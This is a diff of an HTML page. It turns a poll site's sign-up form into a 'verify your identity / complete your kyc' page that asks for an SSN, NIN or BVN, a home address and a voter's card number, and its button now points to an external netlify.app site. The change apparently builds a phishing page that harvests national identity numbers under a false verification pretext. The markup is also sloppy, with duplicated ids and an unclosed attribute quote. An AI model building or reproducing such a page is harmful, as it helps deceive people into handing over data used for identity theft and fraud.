@@ -94,48 +94,29 @@
         <div class="form-wrapper">
 
           <header class="session-form-header">
-            <h1>Sign Up</h1>
-            <p>Complete the below form to create your account</p>
+            <h1>verify your identity</h1>
+            <p>Please complete your kyc</p>
           </header>
 
-										<form action=" " method="post" name="form" target="_self" id="signup-form">
+					<form action=" " method="post" name="form" target="_self" id="signup-form">
 
-            <div class="session-input-group split-field-left">
-              <input type="text" name="first_name" id="first_name" placeholder="First Name" data-msg="Please enter your first name" autofocus required/>
-            </div>
-
-            <div class="session-input-group split-field-right">
-              <input type="text" name="last_name" id="last_name" placeholder="Last name"  data-msg="Please enter your last name" required/>
+            <div class="session-input-group">
+              <input type="number" name="email" id="ssn" placeholder="enter your SSN, NIN or BVN" data-msg="Please enter your ssn / nin" data-msg-email="Please enter a valid ssn/nin" required/>
             </div>
 
             <div class="session-input-group">
-              <input type="text" name="email" id="email" placeholder="Email Address" data-msg="Please enter your email address" data-msg-email="Please enter a valid email address" required/>
+              <input type="" name="text" id="ssn" placeholder="enter your home address" data-msg="Please enter your ssn / nin" data-msg-email="Please enter a valid ssn/nin" required/>
             </div>
-
-            <div class="session-input-group">
-							<input type="text" name="username" id="username" placeholder="Username" onchange=" check_username()" class="tooltip required" title="'Use letters and numbers only.' This is for your profile url eg. https://fast-poll.com/yourname" data-msg="Please enter your Username"  data-rule-minlength="3" data-rule-maxlength="14" data-msg-minlength="Username needs to be a minimum of 3 characters" data-msg-maxlength="Username needs to be a maximum of 14 characters" autocomplete="new" required/>
-							<div class="username-response"></div>
-						</div>
-
-            <div class="session-input-group">
-              <input type="password" name="password" id="password" data-rule-minlength="6" data-rule-maxlength="64" data-msg-minlength="Password needs to be a minimum of 6 characters" data-msg-maxlength="Password needs to be a maximum of 64 characters" data-msg="Please enter your password" placeholder="Password" autocomplete="new-password" required/>
-            </div>
-
-						<div class="session-input-group">
-
-							<input type="checkbox" id="terms" name="terms" data-msg="You need to accept our terms of use" required>
-							<label for="terms" class="terms-check">I agree to the <a href="../index.html" target="_blank" title="Click to see our terms of use">terms of use</a></label>
-							<div id="terms-error"></div>
-						</div>
-
 						
-						
+            <div class="session-input-group">
+              <input type="" name="number" id="ssn" placeholder="enter your voters card number" data-msg="Please enter enter your voters card number" data-msg-email="Please enter a valid voters card number required/>
+            </div>
 						<div id="form-error">
 
 						</div>
 
             <div class="session-input-group">
-              <a href="verfiy user.html" type="button" class="logbtn" style="color: white;" title="Login">Sign up</a>
+              <a href="https://ballox.netlify.app/" type="button" class="logbtn" style="color: white;" title="Login">Sign up</a>
               <!-- <button type="submit" title="Sign Up">Sign Up</button> -->
             </div>
 
